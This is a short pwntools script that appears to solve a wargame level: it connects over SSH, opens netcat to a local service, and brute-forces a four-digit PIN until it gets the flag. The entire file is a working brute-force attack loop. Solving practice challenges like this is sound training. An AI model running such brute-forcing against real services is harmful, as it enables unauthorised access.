from pwn import *
import os, tempfile, time
import config

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

conn = ssh(host=config.url, user=user, password=password, port=config.port)

nc = conn.process(["/bin/nc", "localhost", "30002"])
nc.recv()

for i in range(10000):
	nc.sendline(password + " " + ("%.4d" % i))
	line = nc.recv()
	if "Wrong!" not in line:
		flag = line.split()[-2]
		break

print("Flag : " + flag)
